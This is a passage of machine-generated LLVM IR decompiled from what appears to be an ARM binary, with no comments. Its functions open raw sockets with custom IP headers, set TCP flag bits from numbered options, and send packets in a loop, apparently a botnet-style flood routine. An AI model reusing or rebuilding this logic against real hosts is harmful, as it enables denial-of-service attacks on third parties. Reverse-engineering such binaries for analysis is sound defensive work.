  %v2_b8a4 = add i32 %v1_b8a4, 8
  %v3_b8a4 = inttoptr i32 %v2_b8a4 to i32*
  store i32 %v0_b8a4, i32* %v3_b8a4, align 4
  %v0_b8a8 = load i32, i32* @r5, align 4
  store i32 %v0_b8a8, i32* @r1, align 4
  %v0_b8ac = load i32, i32* @r8, align 4
  store i32 %v0_b8ac, i32* %r2.global-to-local, align 4
  %v0_b8b0 = load i32, i32* @r7, align 4
  store i32 %v0_b8b0, i32* %r3.global-to-local, align 4
  %v0_b8b4 = load i32, i32* @r4, align 4
  store i32 %v0_b8b4, i32* %r0.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r6, align 4
  %v1_b8b8 = trunc i32 %v0_b8b8 to i8
  %v3_b8b8 = add i32 %v0_b8a8, 16
  %v4_b8b8 = inttoptr i32 %v3_b8b8 to i8*
  store i8 %v1_b8b8, i8* %v4_b8b8, align 1
  %v0_b8bc = load i32, i32* @r6, align 4
  %v1_b8bc = trunc i32 %v0_b8bc to i8
  %v2_b8bc = load i32, i32* @r5, align 4
  %v3_b8bc = add i32 %v2_b8bc, 17
  %v4_b8bc = inttoptr i32 %v3_b8bc to i8*
  store i8 %v1_b8bc, i8* %v4_b8bc, align 1
  %v4_b8c0 = call i32 @function_de80(i32 %v0_b8b4, i32 %v0_b8a8, i32 %v0_b8ac, i32 %v0_b8b0)
  %v5_b8c0 = trunc i32 %v4_b8c0 to i8
  store i32 %v4_b8c0, i32* %r0.global-to-local, align 4
  %v4_b8c438 = udiv i32 %v4_b8c0, 256
  %v1_b8c8 = trunc i32 %v4_b8c438 to i8
  %v2_b8c8 = load i32, i32* @r5, align 4
  %v3_b8c8 = add i32 %v2_b8c8, 17
  %v4_b8c8 = inttoptr i32 %v3_b8c8 to i8*
  store i8 %v1_b8c8, i8* %v4_b8c8, align 1
  %v3_b8cc = load i32, i32* @r5, align 4
  %v4_b8cc = add i32 %v3_b8cc, 16
  %v5_b8cc = inttoptr i32 %v4_b8cc to i8*
  store i8 %v5_b8c0, i8* %v5_b8cc, align 1
  %v3_b8d0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b8d0, i32* %r3.global-to-local, align 4
  %v0_b8d4 = load i32, i32* @r4, align 4
  %v1_b8d4 = add i32 %v0_b8d4, 20
  %v2_b8d4 = inttoptr i32 %v1_b8d4 to i32*
  %v3_b8d4 = load i32, i32* %v2_b8d4, align 4
  %v5_b8dc = mul i32 %v3_b8d0, 24
  %v3_b8e4 = udiv i32 %v3_b8d4, 65536
  store i32 %v3_b8e4, i32* %r2.global-to-local, align 4
  %v2_b8e8 = add i32 %v5_b8dc, %arg2
  store i32 %v2_b8e8, i32* %ip.global-to-local, align 4
  %v3_b8ec7 = udiv i32 %v3_b8d4, 16777216
  %v1_b8f0 = trunc i32 %v3_b8ec7 to i8
  %v3_b8f0 = add i32 %v2_b8e8, 3
  %v4_b8f0 = inttoptr i32 %v3_b8f0 to i8*
  store i8 %v1_b8f0, i8* %v4_b8f0, align 1
  %v0_b8f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8f4 = trunc i32 %v0_b8f4 to i8
  %v2_b8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b8f4 = add i32 %v2_b8f4, 2
  %v4_b8f4 = inttoptr i32 %v3_b8f4 to i8*
  store i8 %v1_b8f4, i8* %v4_b8f4, align 1
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b2d0, i32* %r0.global-to-local, align 4
  %v0_b904 = load i32, i32* @sl, align 4
  store i32 %v0_b904, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_b90c = load i32, i32* %ip.global-to-local, align 4
  %v4_b90c = inttoptr i32 %v0_b90c to %sockaddr*
  %v7_b914 = inttoptr i32 %v0_b8f8 to i32*
  %v9_b914 = call i32 @sendto(i32 %v3_b2d0, i32* %v7_b914, i32 %v0_b904, i32 16384, %sockaddr* %v4_b90c, i32 16)
  %v3_b918 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = add i32 %v3_b918, 1
  store i32 %v1_b91c, i32* %r0.global-to-local, align 4
  %v1_b920 = load i32, i32* @fp, align 4
  %v9_b920 = icmp eq i32 %v1_b91c, %v1_b920
  store i1 %v9_b920, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b91c, i32* %stack_var_-40, align 4
  %v6_b928 = icmp slt i32 %v1_b91c, %v1_b920
  br i1 %v6_b928, label %dec_label_pc_b92c, label %dec_label_pc_b7e4

dec_label_pc_b92c:                                ; preds = %dec_label_pc_b840
  store i32 %v4_b130, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b318, i32* %ip.global-to-local, align 4
  %v4_b938 = mul i32 %v1_b91c, 4
  %v5_b938 = add i32 %v4_b938, %v4_b130
  %v6_b938 = inttoptr i32 %v5_b938 to i32*
  %v7_b938 = load i32, i32* %v6_b938, align 4
  store i32 %v7_b938, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b818, i1* %cpsr_z.global-to-local, align 1
  %v1_b944 = add i32 %v7_b938, 20
  store i32 %v1_b944, i32* @r5, align 4
  br i1 %v3_b818, label %dec_label_pc_b94c, label %dec_label_pc_b82c

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b92c, %dec_label_pc_b7f0
  %v0_b94c = call i32 @function_f6c4()
  %v1_b94c = trunc i32 %v0_b94c to i8
  %v4_b950 = sdiv i32 %v0_b94c, 256
  store i32 %v4_b950, i32* %r3.global-to-local, align 4
  %v3_b954 = load i32, i32* @r4, align 4
  %v4_b954 = add i32 %v3_b954, 4
  %v5_b954 = inttoptr i32 %v4_b954 to i8*
  store i8 %v1_b94c, i8* %v5_b954, align 1
  store i1 %v2_b95c, i1* %cpsr_z.global-to-local, align 1
  %v0_b960 = load i32, i32* %r3.global-to-local, align 4
  %v1_b960 = trunc i32 %v0_b960 to i8
  %v2_b960 = load i32, i32* @r4, align 4
  %v3_b960 = add i32 %v2_b960, 5
  %v4_b960 = inttoptr i32 %v3_b960 to i8*
  store i8 %v1_b960, i8* %v4_b960, align 1
  %v0_b964 = load i32, i32* @r4, align 4
  %v1_b964 = add i32 %v0_b964, 40
  store i32 %v1_b964, i32* %r0.global-to-local, align 4
  %v0_b968 = load i32, i32* @sb, align 4
  store i32 %v0_b968, i32* @r1, align 4
  %v0_b96c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b96c, label %dec_label_pc_b840, label %dec_label_pc_b970

dec_label_pc_b970:                                ; preds = %dec_label_pc_b82c, %dec_label_pc_b94c
  %v0_b970 = phi i32 [ %v1_b838, %dec_label_pc_b82c ], [ %v1_b964, %dec_label_pc_b94c ]
  %v1_b970 = inttoptr i32 %v0_b970 to i8*
  %v2_b970 = call i32 @function_f844(i8* %v1_b970)
  store i32 %v2_b970, i32* %r0.global-to-local, align 4
  %v2_b840.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b840

; uselistorder directives
  uselistorder i32 %v0_b964, { 1, 0 }
  uselistorder i32 %v7_b938, { 1, 2, 0 }
  uselistorder i32 %v1_b920, { 1, 2, 0 }
  uselistorder i32 %v1_b91c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_b8c0, { 0, 2, 1 }
  uselistorder i32 %v0_b8a8, { 1, 0, 2 }
  uselistorder i32 %v3_b884, { 1, 0 }
  uselistorder i32 %v3_b864, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b850, { 0, 2, 1 }
  uselistorder i32 %v0_b838, { 1, 0 }
  uselistorder i32 %v0_b7f0, { 1, 0 }
  uselistorder i32 %v0_b7e4, { 1, 0 }
  uselistorder i1 %v3_b818, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b95c, { 2, 1, 0 }
  uselistorder i32 %v1_b7cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b720, { 0, 2, 1 }
  uselistorder i32 %v3_b700, { 1, 0 }
  uselistorder i32 %v0_b6d4, { 1, 0, 2 }
  uselistorder i32 %v3_b6c8, { 1, 0 }
  uselistorder i32 %v1_b62c, { 1, 0 }
  uselistorder i32 %v0_b620, { 1, 2, 0 }
  uselistorder i32 %v3_b5e4, { 1, 0 }
  uselistorder i32 %v2_b5d0, { 1, 0 }
  uselistorder i32 %v3_b5b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b5ac, { 1, 0 }
  uselistorder i32 %v3_b588, { 1, 0, 2 }
  uselistorder i32 %v3_b580, { 1, 0 }
  uselistorder i32 %v4_b568, { 1, 0 }
  uselistorder i32 %v0_b564, { 0, 2, 1 }
  uselistorder i32 %v3_b364, { 1, 2, 3, 0 }
  uselistorder i32 %v5_b518, { 1, 0 }
  uselistorder i1 %v9_b4fc, { 1, 0 }
  uselistorder i32 %v4_b510, { 1, 0 }
  uselistorder i32 %v4_b50c, { 1, 0 }
  uselistorder i32 %storemerge34, { 0, 2, 1 }
  uselistorder i32 %v8_b404, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b3f0, { 1, 0 }
  uselistorder i32 %v7_b3bc, { 4, 1, 3, 0, 2, 5 }
  uselistorder i32 %v1_b78c, { 1, 0 }
  uselistorder i32 %v1_b774, { 1, 0 }
  uselistorder i32 %v1_b75c, { 1, 0 }
  uselistorder i32 %v1_b744, { 1, 0 }
  uselistorder i32 %v1_b72c, { 1, 0 }
  uselistorder i32 %v5_b514, { 1, 0 }
  uselistorder i32 %v3_b44c112, { 1, 0 }
  uselistorder i1 %v2_b52c, { 1, 0 }
  uselistorder i32 %v1_b528, { 1, 0 }
  uselistorder i32 %v4_b524, { 2, 0, 1 }
  uselistorder i32 %v4_b508, { 1, 0 }
  uselistorder i1 %v3_b434, { 1, 0 }
  uselistorder i32 %v1_b348, { 2, 1, 0 }
  uselistorder i32 %v8_b324, { 2, 1, 0 }
  uselistorder i32 %v8_b320, { 1, 2, 0 }
  uselistorder i32 %v3_b318, { 1, 2, 3, 0 }
  uselistorder i32 %v0_b314, { 1, 0, 3, 2 }
  uselistorder i32 %v3_b2d4, { 2, 3, 0, 1 }
  uselistorder i32 %v3_b2d0, { 3, 4, 1, 2, 5, 6, 0, 7, 8 }
  uselistorder i32 %v1_b2c0, { 1, 0 }
  uselistorder i32 %v1_b268, { 1, 2, 0 }
  uselistorder i32 %v1_b248, { 1, 2, 0 }
  uselistorder i32 %v1_b228, { 1, 2, 0 }
  uselistorder i32 %v1_b208, { 1, 2, 0 }
  uselistorder i32 %v1_b1e8, { 1, 2, 0 }
  uselistorder i32 %v1_b1b0, { 1, 2, 0 }
  uselistorder i32 %v5_b16c, { 0, 2, 1 }
  uselistorder i32 %v4_b130, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v4_b120, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_b104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 67, 68, 69, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 51, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 11, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 32, 21, 22, 28, 23, 24, 25, 26, 27, 29, 30, 31, 5, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 65, 2, 3, 5, 4, 11, 7, 9, 12, 10, 21, 13, 14, 15, 16, 17, 18, 19, 20, 25, 22, 23, 24, 26, 28, 27, 46, 43, 29, 32, 30, 33, 34, 31, 36, 35, 37, 38, 39, 41, 40, 42, 8, 6, 44, 45, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0 }
  uselistorder i32* %ip.global-to-local, { 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i1* %cpsr_z.global-to-local, { 25, 26, 27, 1, 2, 4, 5, 6, 7, 10, 8, 9, 11, 21, 12, 13, 14, 16, 0, 17, 18, 15, 19, 20, 3, 22, 23, 24 }
  uselistorder i32 768, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_b970, { 1, 0 }
  uselistorder label %dec_label_pc_b840, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b7c8, { 2, 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %.thread8, { 2, 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %dec_label_pc_b55c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b494, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b428, { 1, 0 }
  uselistorder label %dec_label_pc_b374, { 1, 0 }
}

define i32 @function_b97c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b97c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b97c = load i32, i32* @r4, align 4
  %v1_b980 = urem i32 %arg1, 256
  store i32 %v1_b980, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b998 = urem i32 %arg3, 256
  store i32 %v1_b998, i32* @r4, align 4
  %v2_b99c = call i32* @calloc(i32 %v1_b980, i32 4)
  %v4_b99c = ptrtoint i32* %v2_b99c to i32
  %v0_b9a0 = load i32, i32* @r5, align 4
  store i32 %v0_b9a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b9b0 = load i32, i32* @r4, align 4
  %v5_b9b4 = inttoptr i32 %v0_b9a0 to i32*
  %v6_b9b4 = call i32 @function_930c(i32 %v0_b9b0, i32* %v5_b9b4, i32 2, i32 0, i32 %v4_b99c)
  %v1_b9c0 = urem i32 %v6_b9b4, 256
  store i32 %v1_b9c0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b9cc = load i32, i32* @r5, align 4
  store i32 %v0_b9cc, i32* %r1.global-to-local, align 4
  %v0_b9d0 = load i32, i32* @r4, align 4
  %v5_b9d4 = trunc i32 %v6_b9b4 to i8
  %v6_b9d8 = inttoptr i32 %v0_b9cc to i32*
  %v7_b9d8 = call i32 @function_930c(i32 %v0_b9d0, i32* %v6_b9d8, i32 3, i32 65535, i32 %v6_b9b4)
  %v0_b9dc = load i32, i32* @r5, align 4
  store i32 %v0_b9dc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b9d8, i32* @r8, align 4
  %v0_b9ec = load i32, i32* @r4, align 4
  %v5_b9f0 = inttoptr i32 %v0_b9dc to i32*
  %v6_b9f0 = call i32 @function_930c(i32 %v0_b9ec, i32* %v5_b9f0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_b9f8 = urem i32 %v6_b9f0, 256
  store i32 %v1_b9f8, i32* %ip.global-to-local, align 4
  %v0_b9fc = load i32, i32* @r5, align 4
  store i32 %v0_b9fc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ba08 = load i32, i32* @r4, align 4
  %sext14 = mul i32 %v6_b9f0, 16777216
  %v5_ba10 = sdiv i32 %sext14, 16777216
  %v6_ba10 = inttoptr i32 %v0_b9fc to i32*
  %v7_ba10 = call i32 @function_930c(i32 %v0_ba08, i32* %v6_ba10, i32 5, i32 0, i32 %v5_ba10)
  %v1_ba1c = urem i32 %v7_ba10, 256
  store i32 %v1_ba1c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ba28 = load i32, i32* @r5, align 4
  store i32 %v0_ba28, i32* %r1.global-to-local, align 4
  %v0_ba2c = load i32, i32* @r4, align 4
  %v5_ba34 = inttoptr i32 %v0_ba28 to i32*
  %v6_ba34 = call i32 @function_930c(i32 %v0_ba2c, i32* %v5_ba34, i32 6, i32 65535, i32 %v1_ba1c)
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_ba34, i32* @r7, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  %v5_ba50 = inttoptr i32 %v0_ba3c to i32*
  %v6_ba50 = call i32 @function_930c(i32 %v0_ba4c, i32* %v5_ba50, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_ba58 = load i32, i32* @r5, align 4
  store i32 %v0_ba58, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_ba50, i32* @r6, align 4
  %v0_ba68 = load i32, i32* @r4, align 4
  %v5_ba6c = inttoptr i32 %v0_ba58 to i32*
  %v6_ba6c = call i32 @function_930c(i32 %v0_ba68, i32* %v5_ba6c, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_ba78 = load i32, i32* @r5, align 4
  store i32 %v0_ba78, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r4, align 4
  %v5_ba88 = inttoptr i32 %v0_ba78 to i32*
  %v6_ba88 = call i32 @function_930c(i32 %v0_ba84, i32* %v5_ba88, i32 18, i32 65535, i32 %v6_ba6c)
  %v0_ba8c = load i32, i32* @r5, align 4
  store i32 %v0_ba8c, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r4, align 4
  %v5_baa0 = inttoptr i32 %v0_ba8c to i32*
  %v6_baa0 = call i32 @function_930c(i32 %v0_ba9c, i32* %v5_baa0, i32 11, i32 0, i32 %v6_ba88)
  %v0_baa4 = load i32, i32* @r5, align 4
  store i32 %v0_baa4, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bab4 = load i32, i32* @r4, align 4
  %v5_bab8 = inttoptr i32 %v0_baa4 to i32*
  %v6_bab8 = call i32 @function_930c(i32 %v0_bab4, i32* %v5_bab8, i32 12, i32 1, i32 %v6_baa0)
  %v0_babc = load i32, i32* @r5, align 4
  store i32 %v0_babc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bacc = load i32, i32* @r4, align 4
  %v5_bad0 = inttoptr i32 %v0_babc to i32*
  %v6_bad0 = call i32 @function_930c(i32 %v0_bacc, i32* %v5_bad0, i32 13, i32 0, i32 %v6_bab8)
  %v0_bad4 = load i32, i32* @r5, align 4
  store i32 %v0_bad4, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bae4 = load i32, i32* @r4, align 4
  %v5_bae8 = inttoptr i32 %v0_bad4 to i32*
  %v6_bae8 = call i32 @function_930c(i32 %v0_bae4, i32* %v5_bae8, i32 14, i32 0, i32 %v6_bad0)
  %v0_baec = load i32, i32* @r5, align 4
  store i32 %v0_baec, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bafc = load i32, i32* @r4, align 4
  %v5_bb00 = inttoptr i32 %v0_baec to i32*
  %v6_bb00 = call i32 @function_930c(i32 %v0_bafc, i32* %v5_bb00, i32 15, i32 0, i32 %v6_bae8)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @function_930c(i32 %v0_bb14, i32* %v5_bb18, i32 16, i32 0, i32 %v6_bb00)
  %v0_bb1c = load i32, i32* @r5, align 4
  store i32 %v0_bb1c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bb2c = load i32, i32* @r4, align 4
  %v5_bb30 = inttoptr i32 %v0_bb1c to i32*
  %v6_bb30 = call i32 @function_930c(i32 %v0_bb2c, i32* %v5_bb30, i32 0, i32 512, i32 %v6_bb18)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  %v0_bb44 = load i32, i32* @r4, align 4
  %v5_bb48 = inttoptr i32 %v0_bb40 to i32*
  %v6_bb48 = call i32 @function_930c(i32 %v0_bb44, i32* %v5_bb48, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_bb54 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_bb54, i32* %r3.global-to-local, align 4
  %v1_bb58 = urem i32 %v6_bb48, 256
  store i32 %v1_bb58, i32* %ip.global-to-local, align 4
  %v0_bb5c = load i32, i32* @r5, align 4
  store i32 %v0_bb5c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bb64 = load i32, i32* @r4, align 4
  %v5_bb6c = inttoptr i32 %v0_bb5c to i32*
  %v6_bb6c = call i32 @function_92a0(i32 %v0_bb64, i32* %v5_bb6c, i32 25, i32 %v2_bb54, i32 %v1_bb58)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bb80 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_bb84 = icmp eq i32 %v3_bb80, -1
  store i1 %v2_bb84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb84, label %dec_label_pc_bfbc, label %dec_label_pc_bb90

dec_label_pc_bb90:                                ; preds = %dec_label_pc_b97c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_bb98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_bb98, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_bbac = call i32 @setsockopt(i32 %v3_bb80, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v2_bbb0 = icmp eq i32 %v7_bbac, -1
  store i1 %v2_bbb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bbb0, label %dec_label_pc_bfb4, label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb90
  %v0_bbb8 = load i32, i32* @r8, align 4
  %v0_bbbc = load i32, i32* @r7, align 4
  %v0_bbc0 = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_bbc8 = urem i32 %v0_bbb8, 65536
  store i32 %v3_bbc8, i32* %r2.global-to-local, align 4
  %v3_bbcc = urem i32 %v0_bbbc, 65536
  store i32 %v3_bbcc, i32* %r3.global-to-local, align 4
  %v3_bbd0 = urem i32 %v0_bbc0, 65536
  store i32 %v3_bbd0, i32* %ip.global-to-local, align 4
  %v0_bbd4 = load i32, i32* @fp, align 4
  %v2_bbd4 = icmp eq i32 %v0_bbd4, 0
  store i1 %v2_bbd4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp76 = icmp slt i32 %v0_bbd4, 1
  br i1 %tmp76, label %dec_label_pc_c0d4, label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8
  %v1_bbf4 = add i32 %v6_bb30, 40
  %tmp77 = mul i32 %v1_bbf4, 256
  %v1_bc08 = urem i32 %v0_bbbc, 256
  %v1_bc0c = and i32 %tmp77, 65280
  %v3_bc10 = mul nuw nsw i32 %v1_bc08, 256
  %v1_bc18 = urem i32 %v0_bbc0, 256
  %tmp78 = udiv i32 %v0_bbc0, 256
  %v3_bc1c = urem i32 %tmp78, 256
  %tmp79 = udiv i32 %v1_bbf4, 256
  %tmp80 = udiv i32 %v0_bbbc, 256
  %v4_bc24 = urem i32 %tmp80, 256
  %v5_bc24 = or i32 %v4_bc24, %v3_bc10
  store i32 %v5_bc24, i32* @sl, align 4
  %v4_bc28 = mul nuw nsw i32 %v1_bc18, 256
  %v5_bc28 = or i32 %v4_bc28, %v3_bc1c
  store i32 %v5_bc28, i32* @r6, align 4
  %tmp81 = udiv i32 %v0_bbb8, 256
  %v3_bc38 = urem i32 %tmp81, 256
  %v1_bc3c = urem i32 %v0_bbb8, 256
  %tmp82 = mul i32 %v6_ba6c, 256
  %v1_bc44 = and i32 %tmp82, 65280
  %v1_bc48 = urem i32 %v6_baa0, 2
  %v1_bc4c = urem i32 %v6_bab8, 2
  %v1_bc50 = urem i32 %v6_bad0, 2
  %tmp83 = udiv i32 %v6_ba6c, 256
  %v4_bc54 = urem i32 %tmp83, 256
  %v5_bc54 = or i32 %v4_bc54, %v1_bc44
  store i32 %v5_bc54, i32* @r8, align 4
  %v1_bc74 = urem i32 %v6_bae8, 2
  %v1_bc78 = urem i32 %v6_bb00, 2
  %v1_bc7c = urem i32 %v6_bb18, 2
  %v1_bc80 = urem i32 %v6_bad0, 256
  %v4_bc84 = mul nuw nsw i32 %v1_bc3c, 256
  %v5_bc84 = or i32 %v4_bc84, %v3_bc38
  store i32 %v5_bc84, i32* @r5, align 4
  %v3_bc9826 = udiv i32 %v1_bc0c, 256
  store i32 %v3_bc9826, i32* %r3.global-to-local, align 4
  store i32 %v1_bc3c, i32* %ip.global-to-local, align 4
  store i32 %v1_bc08, i32* %r1.global-to-local, align 4
  store i32 %v1_bc18, i32* %r2.global-to-local, align 4
  %v5_bcb4 = trunc i32 %v0_bbbc to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext9 = mul i32 %v0_bbb8, 16777216
  %v4_bd1c = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp79, 16777216
  %v4_bd30 = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %v1_bbf4, 16777216
  %v4_bd34 = sdiv i32 %sext11, 16777216
  %tmp = sub nsw i32 0, %v1_bc48
  %v4_bd84 = and i32 %tmp, 32
  %tmp94 = sub nsw i32 0, %v1_bc4c
  %v4_bd98 = and i32 %tmp94, 16
  %tmp95 = sub nsw i32 0, %v1_bc50
  %v4_bdac = and i32 %tmp95, 8
  %tmp96 = sub nsw i32 0, %v1_bc74
  %v4_bdc0 = and i32 %tmp96, 4
  %tmp97 = sub nsw i32 0, %v1_bc78
  %v3_bdd4 = and i32 %tmp97, 2
  %sext12 = mul i32 %v0_bbc0, 16777216
  %v7_be04 = sdiv i32 %sext12, 16777216
  %v1_bd18 = trunc i32 %v5_ba10 to i8
  %extract.t = trunc i32 %v4_bd1c to i8
  %v3_be04 = sext i8 %v5_bcb4 to i32
  %v2_be28 = icmp eq i32 %v1_bc80, 0
  br label %dec_label_pc_bcc0

dec_label_pc_bcc0:                                ; preds = %bb90, %dec_label_pc_bbec
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_bccc = call i32* @calloc(i32 1510, i32 1)
  %v4_bccc = ptrtoint i32* %v2_bccc to i32
  store i32 %v4_b99c, i32* %ip.global-to-local, align 4
  %v2_bcd8 = load i32, i32* %r4.global-to-local, align 4
  %v5_bcd8 = mul i32 %v2_bcd8, 4
  %v6_bcd8 = add i32 %v5_bcd8, %v4_b99c
  %v7_bcd8 = inttoptr i32 %v6_bcd8 to i32*
